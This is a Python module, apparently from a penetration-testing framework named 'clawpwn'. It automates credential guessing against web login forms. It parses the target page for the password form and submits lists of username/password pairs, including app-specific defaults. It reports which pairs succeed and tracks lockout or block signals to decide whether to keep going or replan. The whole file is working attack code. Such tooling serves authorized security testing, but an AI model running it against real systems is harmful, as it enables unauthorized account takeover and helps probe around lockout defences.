"""Credential testing implementation."""

from __future__ import annotations

import re
from dataclasses import dataclass, field

import httpx

from clawpwn.modules.attack_feedback import (
    decide_attack_policy,
    extract_attack_signals,
    summarize_signals,
)

from .candidates import build_credential_candidates
from .helpers import extract_base_form_data, extract_field_name, is_login_successful


@dataclass
class CredTestResult:
    """Result of credential testing."""

    form_found: bool
    form_action: str
    credentials_tested: int
    valid_credentials: list[tuple[str, str]]
    details: list[str] = field(default_factory=list)
    hints: list[str] = field(default_factory=list)
    block_signals: list[str] = field(default_factory=list)
    policy_action: str = "continue"
    stopped_early: bool = False
    error: str | None = None


async def test_credentials(
    url: str,
    credentials: list[tuple[str, str]] | None = None,
    app_hint: str | None = None,
) -> CredTestResult:
    """Test credentials against a login form.

    Args:
        url: Target URL containing the login form
        credentials: Optional list of (username, password) tuples to test
        app_hint: Optional application name hint (e.g., "phpmyadmin") to use app-specific creds
    """
    valid_credentials = []
    details = []
    form_found = False
    form_action = ""
    credentials_tested = 0
    hints: list[str] = []
    block_signals: list[str] = []
    policy_action = "continue"
    stopped_early = False
    block_streak = 0

    try:
        async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
            # Get the login page
            response = await client.get(url)
            html = response.text

            # Look for login form — prefer the form that contains a password field
            forms = re.findall(r"<form[^>]*>.*?</form>", html, re.DOTALL | re.IGNORECASE)
            form_match = None
            for candidate in forms:
                if re.search(r'type=["\']password["\']', candidate, re.IGNORECASE):
                    form_match = candidate
                    break
            if form_match is None and forms:
                form_match = forms[0]

            if not form_match:
                return CredTestResult(
                    form_found=False,
                    form_action="",
                    credentials_tested=0,
                    valid_credentials=[],
                    details=["No login form found on the page."],
                )

            form_found = True
            form_html = form_match

            # Extract form action
            action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
            if action_match:
                form_action = action_match.group(1)
                if not form_action.startswith("http"):
                    # Relative URL, make it absolute
                    from urllib.parse import urljoin

                    form_action = urljoin(url, form_action)
            else:
                form_action = url  # Submit to same URL

            # Extract input field names
            username_field = extract_field_name(form_html, ["user", "login", "email"])
            password_field = extract_field_name(form_html, ["pass", "pwd"])
            base_form_data = extract_base_form_data(form_html)

            if not username_field or not password_field:
                return CredTestResult(
                    form_found=True,
                    form_action=form_action,
                    credentials_tested=0,
                    valid_credentials=[],
                    details=[
                        f"Could not identify login fields. "
                        f"Found username field: {username_field}, password field: {password_field}"
                    ],
                )

            details.append(f"Form action: {form_action}")
            details.append(f"Username field: {username_field}, Password field: {password_field}")

            test_creds, strategy = build_credential_candidates(credentials, app_hint)
            details.append(
                f"Credential strategy: {strategy} ({len(test_creds)} candidates, capped)"
            )

            # Test each credential pair
            for username, password in test_creds:
                credentials_tested += 1
                data = {
                    **base_form_data,
                    username_field: username,
                    password_field: password,
                }

                try:
                    login_response = await client.post(form_action, data=data)
                    signals = extract_attack_signals(
                        login_response.text,
                        status_code=login_response.status_code,
                        headers=login_response.headers,
                    )

                    hint_messages = summarize_signals(signals, "hint", limit=2)
                    for message in hint_messages:
                        if message not in hints:
                            hints.append(message)
                            details.append(f"Hint observed ({username}): {message}")

                    block_messages = summarize_signals(signals, "block", limit=2)
                    if block_messages:
                        block_streak += 1
                        for message in block_messages:
                            if message not in block_signals:
                                block_signals.append(message)
                            details.append(f"Block signal ({username}): {message}")
                    else:
                        block_streak = 0

                    decision = decide_attack_policy(signals, block_streak=block_streak)
                    if decision.action != "continue":
                        policy_action = decision.action
                        details.append(f"Policy action: {decision.action} ({decision.reason})")
                    if decision.action == "stop_and_replan":
                        stopped_early = True
                        break

                    # Check for success indicators
                    if is_login_successful(login_response, password_field):
                        valid_credentials.append((username, password))
                        details.append(f"✓ Valid credentials found: {username}:{password}")
                except Exception as e:
                    details.append(f"Error testing {username}:{password} - {e}")
                    signals = extract_attack_signals(str(e))
                    decision = decide_attack_policy(signals, block_streak=block_streak + 1)
                    if decision.action == "stop_and_replan":
                        policy_action = decision.action
                        stopped_early = True
                        details.append(f"Policy action: {decision.action} ({decision.reason})")
                        break

    except Exception as e:
        return CredTestResult(
            form_found=form_found,
            form_action=form_action,
            credentials_tested=credentials_tested,
            valid_credentials=valid_credentials,
            details=details,
            hints=hints,
            block_signals=block_signals,
            policy_action=policy_action,
            stopped_early=stopped_early,
            error=str(e),
        )

    return CredTestResult(
        form_found=form_found,
        form_action=form_action,
        credentials_tested=credentials_tested,
        valid_credentials=valid_credentials,
        details=details,
        hints=hints,
        block_signals=block_signals,
        policy_action=policy_action,
        stopped_early=stopped_early,
    )
